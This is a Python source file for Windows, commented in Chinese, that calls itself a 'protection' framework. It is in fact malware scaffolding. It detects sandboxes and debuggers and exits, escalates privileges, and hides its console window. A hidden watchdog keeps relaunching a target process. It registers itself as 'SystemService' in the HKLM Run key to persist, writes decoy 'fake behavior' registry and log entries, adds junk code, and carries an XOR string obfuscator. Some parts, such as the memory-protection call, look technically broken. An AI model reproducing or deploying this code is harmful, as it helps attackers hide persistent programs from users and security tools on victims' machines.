# -*- coding: utf-8 -*-
# pip install pywin32 psutil

import os
import sys
import time
import ctypes
import psutil
import winreg
import hashlib
import random
import subprocess
from threading import Thread
import win32con
import win32gui
import win32process

# ================= 增强配置管理 =================
class ProtectionConfig:
    PROCESS_NAME = ".\target.exe"
    CHECK_INTERVAL = random.randint(10, 20)  # 动态检查间隔
    OBF_KEY = random.SystemRandom().randint(0x01, 0xFF)  # 动态密钥
    DEBUG_MODE = False  # 调试模式开关
    MUTEX_NAME = "Global\\7B3E159A-04CD-4B3D"  # 互斥体名称

# ================= 核心功能模块 =================
class StringObfuscator:
    def __init__(self):
        self.key = ProtectionConfig.OBF_KEY
    
    def encrypt(self, s):
        return bytes([ord(c) ^ self.key for c in s]).decode('latin-1')
    
    def decrypt(self, s):
        return bytes([ord(c) ^ self.key for c in s]).decode('utf-8')

def create_mutex():
    """创建互斥体防止多实例"""
    mutex = ctypes.windll.kernel32.CreateMutexW(None, False, ProtectionConfig.MUTEX_NAME)
    if ctypes.GetLastError() == 183:
        sys.exit()

def require_admin():
    """智能权限检查（返回管理员状态）"""
    try:
        is_admin = ctypes.windll.shell32.IsUserAnAdmin()
        if not is_admin and ProtectionConfig.DEBUG_MODE:
            print("[INFO] 尝试以管理员权限运行...")
            ctypes.windll.shell32.ShellExecuteW(
                None, "runas", sys.executable, f'"{sys.argv[0]}"', None, 1
            )
        return is_admin
    except Exception as e:
        if ProtectionConfig.DEBUG_MODE:
            print(f"[权限错误] {str(e)}")
        return False

def hide_console():
    """隐藏控制台窗口"""
    try:
        win32gui.ShowWindow(win32gui.GetForegroundWindow(), win32con.SW_HIDE)
    except Exception as e:
        if ProtectionConfig.DEBUG_MODE:
            print(f"[窗口隐藏错误] {str(e)}")

def anti_sandbox():
    """增强型反沙箱检测"""
    try:
        if (psutil.cpu_count() < 2 or
            psutil.disk_usage('C:').total < 50*1024**3 or
            ctypes.windll.kernel32.IsDebuggerPresent()):
            sys.exit(random.randint(0, 127))
    except:
        sys.exit()

def inject_guardian():
    """进程守护线程"""
    def guardian():
        while True:
            try:
                if not any(p.name() == ProtectionConfig.PROCESS_NAME for p in psutil.process_iter()):
                    subprocess.Popen(
                        [sys.executable, ProtectionConfig.PROCESS_NAME],
                        creationflags=subprocess.CREATE_NO_WINDOW,
                        startupinfo=subprocess.STARTUPINFO()
                    )
            except:
                pass
            time.sleep(ProtectionConfig.CHECK_INTERVAL)
    Thread(target=guardian, daemon=True).start()

def protect_memory():
    """内存保护增强"""
    try:
        ctypes.windll.kernel32.VirtualProtect(
            ctypes.c_void_p(id(0)),
            ctypes.c_size_t(1024),
            win32con.PAGE_READONLY,
            ctypes.byref(ctypes.c_ulong(0))
        )
    except Exception as e:
        if ProtectionConfig.DEBUG_MODE:
            print(f"[内存保护] {str(e)}")

# ================= 兼容性模块 =================
def get_safe_path():
    """获取用户可写路径"""
    return os.environ.get('LOCALAPPDATA', os.path.expanduser('~'))

def safe_fake_behavior():
    """安全模式伪装行为"""
    try:
        # 用户级注册表操作
        key_path = r"Software\MyApp\Settings"
        with winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path) as key:
            winreg.SetValueEx(key, "LastUpdate", 0, 
                            winreg.REG_SZ, 
                            time.ctime())
        
        # 创建无害日志
        log_path = os.path.join(get_safe_path(), "app_logs")
        os.makedirs(log_path, exist_ok=True)
        with open(os.path.join(log_path, "activity.log"), "a") as f:
            f.write(f"Normal operation at {time.ctime()}\n")
            
    except Exception as e:
        if ProtectionConfig.DEBUG_MODE:
            print(f"[安全模式错误] {str(e)}")

def fake_behavior():
    """管理员模式伪装行为"""
    try:
        # 系统级注册表操作
        with winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, 
                            r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run") as key:
            winreg.SetValueEx(key, "SystemService", 0, 
                            winreg.REG_SZ, 
                            sys.executable)
    except PermissionError:
        safe_fake_behavior()  # 自动降级
    except Exception as e:
        if ProtectionConfig.DEBUG_MODE:
            print(f"[伪装行为错误] {str(e)}")

def junk_code():
    """干扰代码生成"""
    try:
        [hashlib.md5(str(x).encode()).hexdigest() for x in range(random.randint(10,20))]
    except:
        pass

# ================= 初始化入口 =================
def init_protection():
    """初始化保护措施"""
    create_mutex()
    is_admin = require_admin()
    anti_sandbox()
    hide_console()
    inject_guardian()
    protect_memory()
    return is_admin

if __name__ == "__main__":
    admin_status = init_protection()
    junk_code()
    
    if admin_status:
        fake_behavior()
        if ProtectionConfig.DEBUG_MODE:
            print("[DEBUG] 管理员模式运行")
    else:
        safe_fake_behavior()
        if ProtectionConfig.DEBUG_MODE:
            print("[DEBUG] 普通用户模式运行")
    
    # 保持主线程存活
    while True:
        time.sleep(3600)
